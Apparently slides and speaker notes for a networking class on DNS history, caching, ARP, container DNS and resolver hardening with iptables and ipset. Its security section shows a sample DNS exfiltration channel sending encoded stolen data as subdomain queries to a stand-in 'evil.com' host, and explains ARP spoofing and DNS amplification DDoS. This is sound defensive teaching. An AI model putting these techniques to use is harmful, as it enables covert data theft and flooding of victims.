02
The origin story — why does this exist?

In 1971, Stanford maintained a text file.
That was the internet.

HOSTS.TXT — the original internet directory
# Stanford's HOSTS.TXT — everyone FTP'd a copy 10.0.0.1 mit-ai.arpa 10.0.0.2 stanford-ai.arpa 10.0.0.3 bbn-unix.arpa # One authoritative copy. Updated manually. # Distributed weekly via FTP. # Worked fine for ~200 nodes.

Every machine had this file. One org maintained it. It broke the moment the internet started growing past a few hundred hosts.

The fossil is still alive. Run cat /etc/hosts on any Linux machine right now. The file that replaced a global FTP'd text file is still there — and still checked first on every DNS query. We'll see exactly why in a few slides.
The four problems that forced a new design
①
IP addresses change when servers move. Hardcoding them breaks applications.
②
One organization cannot maintain a file for millions of machines. Doesn't scale.
③
Weekly FTP sync means stale data. You need near-real-time propagation.
④
Different organizations need to manage their own namespaces without a central bottleneck.
The insight — RFC 1034 & 1035, 1983

Delegate. Distribute. Cache. Break the namespace into a hierarchy where each level only needs to know about the level below it. No single machine needs a complete picture of the internet — just its own zone and pointers to the next level down.

Paul Mockapetris, 1983. Still the foundation of every DNS query on the planet today.

Do the fossil demo live first: "Before I explain how DNS works, here's what it replaced." cat /etc/hosts. Then: "This file is still checked before DNS on every single query. The mechanism that replaced a global FTP'd text file still uses that file as its first lookup. We'll see the exact config that controls this in a few slides."

Scale is the key insight: "The internet in 1983 had a few hundred nodes. Today, hundreds of millions of domains. The HOSTS.TXT approach would be a multi-gigabyte file every machine downloads weekly. The hierarchy that replaced it means your machine asks only three or four questions to find any name on the planet — and caches the answer for everyone downstream."

Root servers — the 13 logical clusters

A through M. Not 13 physical machines — 13 anycast address ranges, each served by hundreds of nodes globally. Your query hits the geographically closest instance.

The forest/tree metaphor lands well: "Think of the root zone as the forest — it contains everything but knows only the top level. The TLDs are individual trees — .com, .org, .io. The authoritative zones are branches on those trees. Your A record is a single leaf. To find any leaf you start at the forest and follow the branches down. No one has to maintain a map of the whole forest — each branch only knows its own subtree."

Anycast is worth 30 seconds: "There aren't 13 machines running the internet. There are 13 IP address ranges, each served by hundreds of physical servers worldwide via anycast routing. When you query a root server, you hit the closest physical node. The internet is more robust than it looks."

TTL, caching & why DNS changes feel slow

DNS is a distributed cache.
TTL is the number that controls everything.

The cache chain — every layer caches independently
1
Browser DNS cache — Chrome, Firefox cache answers locally. Separate from OS.
↓ miss
2
OS stub resolver — systemd-resolved at 127.0.0.53. Caches per TTL.
↓ miss
3
Recursive resolver — Pi-hole, ISP, 8.8.8.8. Shared cache across all clients.
↓ miss
4
Authoritative server — the source of truth. Always fresh. Sets the TTL.
# Watch TTL count down — run 3 times dig github.com | grep -A1 "ANSWER" # First run: TTL 60 # 30s later: TTL 30 ← counting down # 60s later: TTL 60 ← re-fetched, reset # Flush the OS cache # Ubuntu: sudo resolvectl flush-caches # RHEL8: sudo systemd-resolve --flush-caches
Low TTL (60s)

Fast failover. DNS changes propagate in minutes. Higher query load on resolvers. Use during migrations and for critical services.

High TTL (86400)

Low query load. Old IP can persist for 24 hours after a change. Safe for stable, rarely-changing records.

The migration trap — every engineer hits this once. You change a DNS record. An hour later half the world still sees the old IP. The reason: your previous TTL was 86400. Every resolver cached the old answer for up to 24 hours. The fix: lower TTL to 60 at least 24 hours before the change — not after. The old cache has to expire first.
Negative TTL — the less-known gotcha. NXDOMAIN responses (name doesn't exist) are also cached, per the SOA's negative TTL. Create a record, query it too early, get NXDOMAIN cached — you'll wait for that negative cache to expire before you see the new record. dig SOA github.com — the last number in the SOA is the negative TTL.
The ops checklist for any DNS migration: Lower TTL 24h before → make change → wait for old TTL to expire across all resolvers → raise TTL back. Skipping step one is the most common cause of prolonged DNS propagation issues.
The TTL countdown demo is visceral: Run dig github.com three times with 30-second pauses between. Let them watch the TTL number count down. Then flush with resolvectl flush-caches and run again — TTL resets. This makes caching concrete in under 2 minutes.

The migration trap story: "This is a rite of passage. Every engineer discovers this at 2am during their first DNS migration. They've changed the record. The monitoring is still red. Half the world still sees the old IP. The answer is always the same: you needed to lower the TTL 24 hours before the change, not after. Remember this and you'll skip that particular 2am."

08
The last translation — before bits leave the NIC

ARP. IP address → MAC address.
The layer nobody teaches until something breaks.

Why ARP exists — the gap DNS and routing leave open

DNS gives you an IP. The routing table gives you a next-hop and an interface. But Ethernet frames need a MAC address — not an IP. ARP (Address Resolution Protocol) bridges that gap on the local segment.

Step 1 — Routing says: send to 10.0.0.1 via enp0s6
Step 2 — ARP cache lookup for 10.0.0.1 → hit or miss
Step 3 — If miss: broadcast on enp0s6 "Who has 10.0.0.1?"
Step 4 — Gateway replies with its MAC address. Cache it.
Step 5 — Ethernet frame built with gateway's MAC. Sent.
Critical constraint — ARP is local segment only. You cannot ARP across a router. ARP broadcasts stay on the local subnet. When your packet needs to cross a router, the frame carries the router's MAC — not the final destination's MAC. The destination IP stays unchanged. The MAC changes at every hop.
ARP spoofing — why this matters for security

ARP has no authentication. An attacker on the same segment can broadcast fake ARP replies: "I have 10.0.0.1, my MAC is AA:BB:CC..." — poisoning every host's ARP cache. Traffic meant for the gateway now flows through the attacker. This is a classic MITM attack on local networks. VLANs and Dynamic ARP Inspection (DAI) on managed switches mitigate it.

Commands — Ubuntu & RHEL 8 (identical)
# The ARP / neighbor cache ip neigh show arp -n # legacy, still works # Watch ARP resolve in real time sudo tcpdump -i enp0s6 arp # Flush a stale ARP entry sudo ip neigh del 10.0.0.1 dev enp0s6 # Static ARP entry (permanent) sudo arp -s 10.0.0.1 aa:bb:cc:dd:ee:ff

The same primitives — applied at scale

Containers and Kubernetes didn't invent
new networking. They reused everything you just learned.

The same concepts at three layers
Bare Metal — what you know now
DNS is external. One /etc/hosts, one /etc/resolv.conf, one routing table. The kernel handles it all.
Docker — per-network namespace
Each container gets its own /etc/hosts and /etc/resolv.conf injected at start. The Docker daemon runs an embedded DNS resolver at 127.0.0.11 inside each custom network. Container names resolve to container IPs automatically — same mechanism as bare metal, scoped to the network namespace.
Kubernetes — cluster-scale DNS delegation
CoreDNS runs as a pod. Every pod's /etc/resolv.conf points to the CoreDNS cluster IP. Service names follow a structured FQDN: svc.ns.svc.cluster.local. This is the delegation tree concept — but CoreDNS is the root of the cluster's forest, not the internet root servers.
The mental model transfer. Docker's embedded DNS at 127.0.0.11 is your /etc/resolv.conf, scoped to a container. CoreDNS is your ISP's recursive resolver, scoped to a cluster. The FQDN my-svc.my-ns.svc.cluster.local is a delegation tree exactly like github.com. — just with a different root. Same concept. Different scope.
Docker DNS — visible from inside a container
# What does a container's resolv.conf look like? docker run --rm alpine cat /etc/resolv.conf # → nameserver 127.0.0.11 # → options ndots:0 # Docker's embedded resolver answers container names docker run --rm --network my-net alpine \ nslookup my-other-container # → resolves to container IP on the bridge # The bridge in the routing table ip route show | grep br- # → 172.20.0.0/24 dev br-3037a # Same routing table you already know
Kubernetes DNS — the cluster's delegation tree
# Every pod's /etc/resolv.conf kubectl exec -it my-pod -- cat /etc/resolv.conf # → nameserver 10.96.0.10 (CoreDNS ClusterIP) # → search my-ns.svc.cluster.local svc.cluster.local # Service FQDN breakdown: my-svc.my-ns.svc.cluster.local # ^svc ^namespace ^type ^cluster domain # Short names work because of 'search' domains # "my-svc" expands to the full FQDN automatically # Query CoreDNS directly kubectl run -it --rm debug --image=busybox \ -- nslookup kubernetes.default
The ndots setting — the K8s DNS trap. ndots:5 in K8s pod resolv.conf means any name with fewer than 5 dots gets the search domain appended before trying as an absolute name. curl github.com from a pod first tries github.com.my-ns.svc.cluster.local, then github.com.svc.cluster.local, then github.com.cluster.local, then finally github.com. — four DNS queries for what looks like one. Real latency impact. Mitigate with trailing dot: github.com.
The key insight to land hard: "Everything we've learned today — /etc/hosts, /etc/resolv.conf, the resolution chain, routing tables, bridges — Docker just does all of that automatically per container. Kubernetes does it per pod at cluster scale. The mental model is identical. The scope changes. The concepts don't."

The ndots trap is worth 60 seconds: "In Kubernetes, a simple curl to an external domain makes four DNS queries before it gets the right answer. That's a 4x DNS overhead tax on every external connection from a pod. It's real, measurable latency. You fix it by appending a trailing dot to absolute domain names — that tells the resolver it's already fully qualified, skip the search domain expansion."

The security surface — DNS is not just a lookup service

DNS can be poisoned, tunneled, split,
and weaponized. Know the attack surface.

⚠ Cache Poisoning — Kaminsky (2008)

Attacker floods a resolver with forged responses, racing to get a malicious record cached before the real answer arrives. Once cached, every client using that resolver gets the attacker's IP. Dan Kaminsky found this affected virtually every DNS implementation simultaneously — the internet had to be patched in coordinated secrecy.

DNSSEC adds cryptographic signatures to records. The trust chain goes root → TLD → authoritative, signed all the way down. Unbound validates them. Without DNSSEC, every cached record is a trust assumption.

⚠ DNS Exfiltration — The Invisible Channel
# Data encoded in subdomain queries dGhpcyBpcyBzdG9sZW4gZGF0YQ.evil.com bW9yZSBzdG9sZW4gZGF0YQ.evil.com # Attacker's authoritative NS logs every query # Decode base64 → exfiltrated data reassembled

DNS is almost never blocked at firewalls — it's required infrastructure. Attackers encode stolen data in query subdomains and send them to attacker-controlled authoritative servers. Looks like noise. Bypasses almost every perimeter defense. Pi-hole's query anomaly detection is a primitive version of enterprise DNS threat intelligence.

Split-Horizon DNS — same name, different answer
# From the internet: dig api.company.com → 203.0.113.42 (public ALB) # Same query, from inside the VPN: dig api.company.com → 10.10.0.50 (private endpoint)

The authoritative server returns different records based on the requester's source IP. Internal clients hit private IPs directly. External clients hit public load balancers. AWS Route53 private hosted zones work exactly this way. This is how your upcoming VPN session will tie back to DNS — the same name resolves differently depending on which resolver you're using.

/etc/hosts as an attack vector

Because /etc/hosts is checked before DNS, local compromise of that file redirects any name anywhere. Malware that gets root can silently redirect bank.com to a phishing IP — every application on the machine will follow, because the OS resolution chain says files come first. This is why container runtimes that inject /etc/hosts entries require careful trust boundaries.

Preview — VPN session. Split-horizon DNS is the mechanism that makes internal service names work when you're connected to a VPN. The VPN server pushes a private resolver. That resolver has private zone records. Same name, different answer based on which resolver you hit. We'll build this in the WireGuard session.
DNS exfiltration always surprises the room: "Raise your hand if you've ever considered that a DNS query could steal data. DNS is almost never blocked at corporate firewalls because if you block DNS, nothing works. Attackers know this. The domain you register, the subdomains you encode data into, the authoritative server you control — that's an exfiltration channel that bypasses almost every perimeter defense. This is why enterprise DNS analytics exists as a product category."

Split-horizon is the seed for the VPN session: "We'll come back to split-horizon in the WireGuard session. For now just remember: the same name can resolve to different IPs depending on which resolver you use. That's not a bug — it's a feature that makes private infrastructure work."

Why you must restrict access to your resolver

An open resolver is a weapon.

DNS Amplification — how DDoS weaponizes open resolvers
# DNS is UDP — stateless. Source IP is trivially spoofed. Attacker spoofs src IP = victim's IP Attacker sends: small query (~60 bytes) → open resolver Open resolver: large response (~3000 bytes) → victim's IP Amplification factor: 50x # Attacker expends 1 Gbps → victim absorbs 50 Gbps # With a botnet of 10,000 resolvers...
①
Attacker queries for a large record type (ANY, big TXT) using victim's IP as source
②
Your open resolver does the work and sends the large response to the victim
③
Multiplied across thousands of open resolvers — victim is flooded
④
Traffic looks legitimate — it comes from real DNS servers, not the attacker
Real scale. The Spamhaus attack (2013) hit 300 Gbps using open DNS resolvers — largest recorded at the time. The Dyn attack (2016) took down Twitter, Netflix, and GitHub by targeting DNS infrastructure directly with Mirai botnet traffic. DNS is not a benign protocol. It is critical infrastructure with a significant attack surface.
The right way to lock it down — DOCKER-USER + ipset

Rather than configuring the resolver itself to restrict clients, we use iptables in the DOCKER-USER chain with an ipset allowlist. This enforces the restriction at the kernel level — before the packet even reaches Pi-hole.

# Create the allowlist ipset sudo ipset create dns-allowed hash:net sudo ipset add dns-allowed 10.10.0.0/24 # VPN clients sudo ipset add dns-allowed 172.20.0.0/24 # Docker compose net sudo ipset add dns-allowed 192.168.1.0/24 # LAN # DOCKER-USER chain rules (from vpn7) # Rule 4 & 5 — the actual enforcement: DROP udp dpt:53 ! match-set dns-allowed src DROP tcp dpt:53 ! match-set dns-allowed src # "Drop DNS from anyone NOT in the allowlist" # Inverse match — deny by exception
Why ipset over individual iptables rules
①
O(1) hash lookup — ipset uses a hash table. 1 rule matches 10,000 IPs with the same overhead as matching 1. Traditional iptables rules are O(n) — every rule is checked in sequence.
②
Atomic updates — add or remove IPs from the set without touching iptables rules. No rule reload, no traffic interruption.
③
Single rule, unlimited members — one iptables rule enforces the entire allowlist. The set grows without adding complexity to the ruleset.
④
Inspectable — ipset list dns-allowed shows exactly who is allowed. No need to parse iptables output.
# Inspect the allowlist sudo ipset list dns-allowed # Add a host at runtime — no iptables reload sudo ipset add dns-allowed 10.10.0.42 # Verify the DOCKER-USER rules sudo iptables -L DOCKER-USER --line-numbers -n
The civic responsibility point. You didn't build Pi-hole to be part of a DDoS fleet. But if port 53 is reachable from the internet and you run a recursive resolver, that's exactly what you are — an amplifier waiting to be aimed. Locking down your resolver isn't paranoia. It's the same reason you don't leave your car running with the keys in it.
The amplification math lands hard when you do it explicitly: "A 60-byte query produces a 3,000-byte response. That's 50x amplification. An attacker with a 1 Gbps botnet can deliver 50 Gbps to a victim — using YOUR resolver to do it, using YOUR bandwidth, and the traffic traces back to your IP, not theirs. That's the threat model."

The ipset explanation resonates with the engineers in the room: "Traditional iptables is a linked list. The kernel checks each rule in order. Rule 1, rule 2, rule 3... If you have 500 IP addresses you want to block, that's 500 rule comparisons on every packet. ipset is a hash table. One rule, one hash lookup, done — regardless of whether the set has 10 entries or 10 million. This is the right data structure for the problem."

Show the actual vpn7 DOCKER-USER rules: sudo iptables -L DOCKER-USER --line-numbers -n — point to rules 4 and 5. "This is the actual enforcement. The exclamation mark is the inverse match — drop if NOT in the set. Everything else gets through. Clean, auditable, fast."
